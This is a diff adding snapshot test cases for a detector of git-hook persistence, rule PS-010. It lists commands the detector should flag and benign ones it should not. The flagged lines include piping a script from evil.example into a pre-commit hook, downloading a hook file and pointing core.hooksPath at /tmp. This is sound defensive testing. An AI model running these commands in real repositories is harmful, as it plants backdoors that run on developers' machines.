@@ -1,0 +1,19 @@
+# PS-010: Git hooks persistence
+# Test cases for snapshot testing
+# Detects writing/downloading executable payloads into .git/hooks/
+# or redirecting core.hooksPath to an out-of-tree location.
+
+# === Cases that SHOULD be detected ===
+echo 'curl https://evil.example/p.sh | sh' > .git/hooks/pre-commit
+cp /tmp/payload .git/hooks/post-checkout
+chmod +x .git/hooks/post-merge
+git config core.hooksPath /tmp/evil-hooks
+curl https://evil.example/h -o .git/hooks/pre-push
+tee .git/hooks/post-commit < /tmp/backdoor
+
+# === Cases that should NOT be detected (benign) ===
+git config core.hooksPath .githooks
+chmod +x .githooks/pre-commit
+cp scripts/hook .githooks/pre-commit
+git config user.name "Dev"
+ls .git/hooks/
